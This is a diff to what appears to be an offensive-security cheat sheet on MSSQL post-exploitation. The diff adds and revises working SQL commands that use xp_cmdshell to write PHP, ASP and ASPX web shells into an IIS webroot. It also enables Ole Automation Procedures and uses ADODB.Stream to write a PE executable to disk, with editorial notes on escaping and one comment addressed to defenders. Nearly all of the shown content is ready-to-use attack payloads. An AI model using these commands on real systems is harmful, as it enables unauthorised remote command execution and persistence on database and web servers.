@@ -38,11 +38,16 @@ EXEC xp_cmdshell 'powershell -c "Set-Content -Path C:\temp\file.txt -Value ''con
 
 #### Writing Web Shells
 
+**Note:** The caret (`^`) escapes below are for cmd.exe. For PowerShell, use the backtick (`` ` ``) or encode content as base64.
+
 ```sql
--- PHP web shell
+-- PHP web shell (cmd.exe - uses caret escaping)
 EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';
 
--- ASP classic web shell
+-- PHP web shell (PowerShell alternative)
+EXEC xp_cmdshell 'powershell -c "''<?php system($_GET[\"cmd\"]); ?>'' | Out-File -Encoding ascii C:\inetpub\wwwroot\shell.php"';
+
+-- ASP classic web shell (cmd.exe)
 EXEC xp_cmdshell 'echo ^<%Response.Write(CreateObject("WScript.Shell").exec(Request.QueryString("cmd")).StdOut.ReadAll())%^> > C:\inetpub\wwwroot\shell.asp';
 
 -- ASPX web shell (base64 decode approach)
@@ -95,6 +100,8 @@ EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXEC sp_configure 'Ole Automation Procedures', 1;
 RECONFIGURE;
+-- WARNING: This change is instance-wide and persists across restarts.
+-- Defenders should monitor sys.configurations for unauthorized changes.
 
 -- Write text file
 DECLARE @fso INT, @file INT;
@@ -112,7 +119,8 @@ DECLARE @stream INT;
 EXEC sp_OACreate 'ADODB.Stream', @stream OUTPUT;
 EXEC sp_OASetProperty @stream, 'Type', 1;  -- Binary
 EXEC sp_OAMethod @stream, 'Open';
-EXEC sp_OAMethod @stream, 'Write', NULL, 0x4D5A...;  -- Binary data as hex
+EXEC sp_OAMethod @stream, 'Write', NULL, 0x4D5A9000...;  -- Replace with full hex byte sequence
+-- Note: 0x4D5A is the 'MZ' DOS header signature for PE executables
 EXEC sp_OAMethod @stream, 'SaveToFile', NULL, 'C:\temp\binary.exe', 2;
 EXEC sp_OAMethod @stream, 'Close';
 EXEC sp_OADestroy @stream;
